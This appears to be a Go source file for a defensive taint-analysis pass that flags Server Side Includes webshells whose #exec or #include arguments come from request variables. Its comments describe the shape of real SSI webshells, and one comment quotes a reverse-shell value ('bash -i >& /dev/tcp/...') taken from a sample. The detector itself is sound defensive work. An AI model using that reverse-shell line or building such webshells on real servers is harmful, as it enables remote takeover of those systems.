// Package ssitaint is a source-to-sink taint pass for Server Side Includes. It supplies
// CONFIRMED-BAND evidence: a request value demonstrably reaching an SSI execution or inclusion
// sink in the same document.
//
// WHY THIS EXISTS.
// The shipped rule `ssi_exec_webshell` fires on the PRESENCE of `#exec cmd=` or `#exec cgi=` and
// scores 80. Measured 2026-09-07 against files harvested from legitimate projects, that predicate
// cannot rank: Digi's embedded-SDK sample page (`#exec cmd="/log.cgi"`), the netCDF Operators
// documentation site (`#exec cmd="openssl dgst -md5 src/nco-5.3.9.tar.gz"`) and the Dublin Core
// Metadata Initiative's 1998 website (`#exec cgi="/cgi-bin/metawriter.cgi"`) all score 80 --
// identically to a real webshell whose command comes from the query string. The same collapse
// occurs in `admission.classify`, which called all three `webshell`.
//
// The corpus consequence is worse than the ranking one. The benign shtml pool is 168 files of
// which exactly TWO contain `#exec`, and those two are the entire basis of the published 1.19%
// shtml FPR. So the rate is measured on two hard cases, and 245 harvested candidates could not be
// admitted to fix that because the classifier calls them all malicious.
//
// PRIOR ART -- see langkit/shtml/ssi-taint-lit-review.md (sources S9-S13), and note what each one
// licenses:
//
//   - Taint is the field's method for injection classes (TChecker CCS'22, Artemis, DjangoChecker,
//     SonarQube). No surveyed tool applies it to SSI, and the OWASP CRS has zero SSI coverage.
//   - The taxonomy itself frames this class as taint: CWE-97's category memberships include
//     CWE-990, "SFP Secondary Cluster: Tainted Input to Command".
//   - CVE-2025-58098 (Apache <= 2.4.65, moderate, fixed 2.4.66) is a current instance of exactly
//     the query-string-to-`#exec cmd` flow this pass looks for.
//
// WHAT THIS DETECTS, AND WHAT IT DOES NOT. CWE-97 proper is directive INJECTION -- the attacker
// supplies `<!--#exec cmd="..."-->` as data and the server renders then parses it. That directive
// never exists in a stored file, so a disk scanner cannot see it and this pass does not claim to.
// What it detects is a tainted ARGUMENT to an AUTHORED directive: command injection reached
// through SSI. Both real shtml samples in the corpus are that shape.
//
// WHY IT IS TRACTABLE WITHOUT A PARSER. SSI has no expression language, no functions, no scope and
// no aliasing. `#set` is the only assignment form, and Apache documents the propagation rule
// (S9): "Variable substitution is done within quoted strings in most cases where they may
// reasonably occur as an argument to an SSI directive. This includes the config, exec, flastmod,
// fsize, include, echo, and set directives." So the graph is a flat intra-file chain, and this
// follows `internal/perlpytaint`'s regex-driven shape rather than `internal/phptaint`'s parser.
//
// AN ESCALATOR, NOT A REPLACEMENT -- the same contract as the Perl/Python and ASP passes. The rule
// keeps recall at its current band; a proven flow is what earns `confirmed`. Both real samples are
// already detected at 80, so this pass adds no recall on today's corpus. What it adds is the
// ability to tell them apart from the 58 benign `#exec` pages, which is the prerequisite for
// lowering the untainted tier -- and that lowering is a separate, measured change.
package ssitaint

import (
	"fmt"
	"regexp"
	"strings"
)

const (
	// Matches the other taint passes: the confirmed band is what a proven flow earns.
	score = 85
	// Same bound as perlpytaint. An SSI page is a document, not an archive.
	maxInput = 2 << 20
)

// Finding is one proven source-to-sink flow. Converted to a finding.Finding by the diskprobe
// wiring, mirroring how perlpytaint.Finding and asptaint.Finding are handled.
type Finding struct {
	Score    int
	Family   string
	Rule     string // full knowledge-ref, e.g. "ssitaint:exec-on-request"
	Evidence string
}

// One SSI element. `.*?` rather than `[^>]*` for the body because a value may legitimately
// contain `>`: the second real sample sets `value="bash -i >& /dev/tcp/0.0.0.0/1337 0>&1"`, and a
// `[^>]*` body would truncate mid-directive.
var directiveRe = regexp.MustCompile(`(?is)<!--\s*#\s*([a-z]+)(.*?)-->`)

// An attribute inside a directive body: quoted either way, or bare. Bare matters -- both real
// samples write `value=$QUERY_STRING_UNESCAPED` and `cmd=$shl` with no quotes at all, which is
// the form the field's published literal does not consider.
var attrRe = regexp.MustCompile(`(?is)([a-z_]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|(\S+))`)

// A variable reference. Apache accepts both `$NAME` and `${NAME}`.
var refRe = regexp.MustCompile(`\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?`)

// requestSources are the variables an HTTP request controls, taken from Apache's own mod_include
// documentation plus the CGI environment it exposes (S9: "The include variables are available to
// the command, in addition to the usual set of CGI variables"). OWASP WSTG independently confirms
// the wider set: "Possible input vectors may also include headers and cookies."
//
// THE SEVERITY ORDERING IS THE REVERSE OF THE INTUITIVE ONE, and a model that ranked by name would
// get it backwards. S9 on QUERY_STRING_UNESCAPED: it "contains the (%-decoded) query string, which
// is *escaped* for shell usage ... Use DOCUMENT_ARGS if shell escaping is not desired." So the
// variable whose name says UNESCAPED is the escaped one, and DOCUMENT_ARGS is the raw one. Both
// are sources; the naming is simply not a guide.
var requestSources = map[string]bool{
	// mod_include's own request-derived variables.
	"QUERY_STRING_UNESCAPED": true,
	"DOCUMENT_ARGS":          true,
	"DOCUMENT_PATH_INFO":     true,
	// The CGI environment, RFC 3875.
	"QUERY_STRING":    true,
	"REQUEST_URI":     true,
	"PATH_INFO":       true,
	"PATH_TRANSLATED": true,
	"CONTENT_TYPE":    true,
	"CONTENT_LENGTH":  true,
	// Request headers arrive as HTTP_*; handled by prefix below as well, but the common ones are
	// named so the intent is greppable.
	"HTTP_USER_AGENT":      true,
	"HTTP_REFERER":         true,
	"HTTP_COOKIE":          true,
	"HTTP_X_FORWARDED_FOR": true,
}

// DELIBERATELY NOT SOURCES. Apache documents these as document or server metadata, and both real
// samples echo DOCUMENT_NAME, DATE_GMT, DATE_LOCAL, LAST_MODIFIED and USER_NAME in their own
// banner -- so treating them as sources would taint the shells' decoration rather than their
// payload, and would fire on any page that prints its own modification date.
//
// DOCUMENT_URI is excluded for a different reason and it is a judgement: S9 calls it "The
// (%-decoded) URL path of the document requested by the user", so a request does influence it, but
// only by choosing which existing file to fetch. It is not free-form attacker text, both real
// samples echo it benignly, and including it would taint every page that displays its own URL.
// Recorded here rather than silently omitted.
func isSource(name string) bool {
	if requestSources[name] {
		return true
	}
	// Any request header, not just the named ones.
	return strings.HasPrefix(name, "HTTP_")
}

type attrs map[string]string

func attrsOf(body string) attrs {
	out := attrs{}
	for _, m := range attrRe.FindAllStringSubmatch(body, -1) {
		name := strings.ToLower(m[1])
		val := m[2]
		if val == "" {
			val = m[3]
		}
		if val == "" {
			val = m[4]
		}
		if _, seen := out[name]; !seen {
			out[name] = val
		}
	}
	return out
}

// refsTainted reports whether the value references a request source directly, or a variable
// already known to be tainted.
func refsTainted(value string, tainted map[string]bool) (string, bool) {
	for _, m := range refRe.FindAllStringSubmatch(value, -1) {
		name := m[1]
		if isSource(name) {
			return name, true
		}
		if tainted[name] {
			return name, true
		}
	}
	return "", false
}

type element struct {
	name string // directive, lower-cased: set, exec, include, ...
	attr attrs
}

// sinks maps a directive to the attributes that execute or fetch, with the family each earns.
// `#include file` and `#include virtual` are both included: S9 says virtual issues a subrequest
// and supports query strings, and file reads a path relative to the document. A tainted argument
// to either is arbitrary read at minimum.
var sinks = []struct {
	directive string
	attr      string
	family    string
	rule      string
	what      string
}{
	{"exec", "cmd", "SSIExec", "ssitaint:exec-cmd-on-request", "#exec cmd (executed with /bin/sh)"},
	{"exec", "cgi", "SSIExec", "ssitaint:exec-cgi-on-request", "#exec cgi (invoked as a CGI script)"},
	{"include", "virtual", "SSIInclude", "ssitaint:include-virtual-on-request", "#include virtual (subrequest)"},
	{"include", "file", "SSIInclude", "ssitaint:include-file-on-request", "#include file"},
}

// Analyze returns one finding per SINK KIND reached by request data, never one per source. The
// second real sample sets six variables from the query string and execs five of them; reporting
// the cross-product would bury the one fact an operator needs.
func Analyze(src []byte) []Finding {
	if len(src) == 0 || len(src) > maxInput {
		return nil
	}
	text := string(src)

	elements := make([]element, 0, 16)
	for _, m := range directiveRe.FindAllStringSubmatch(text, -1) {
		elements = append(elements, element{name: strings.ToLower(m[1]), attr: attrsOf(m[2])})
	}
	if len(elements) == 0 {
		return nil
	}

	// Fixpoint over `#set`, so `a` <- source, `b` <- $a, sink <- $b resolves. Flow-INSENSITIVE on
	// purpose: both real samples guard the assignment with `#if expr` and set a hardcoded default
	// in the taken branch, so a flow-sensitive pass that trusted the guard would miss the shell.
	// An attacker reaches the else branch by supplying a query string.
	tainted := map[string]bool{}
	for round := 0; round < len(elements)+1; round++ {
		grew := false
		for _, el := range elements {
			if el.name != "set" {
				continue
			}
			name, value := el.attr["var"], el.attr["value"]
			if name == "" || tainted[name] {
				continue
			}
			if _, ok := refsTainted(value, tainted); ok {
				tainted[name] = true
				grew = true
			}
		}
		if !grew {
			break
		}
	}

	var out []Finding
	reported := map[string]bool{}
	for _, el := range elements {
		for _, s := range sinks {
			if el.name != s.directive {
				continue
			}
			value, present := el.attr[s.attr]
			if !present {
				continue
			}
			via, ok := refsTainted(value, tainted)
			if !ok {
				continue
			}
			if reported[s.family] {
				continue
			}
			reported[s.family] = true
			out = append(out, Finding{
				Score:  score,
				Family: s.family,
				Rule:   s.rule,
				Evidence: fmt.Sprintf(
					"request-controlled value reaches %s: %s carries attacker input", s.what, via),
			})
		}
	}
	return out
}
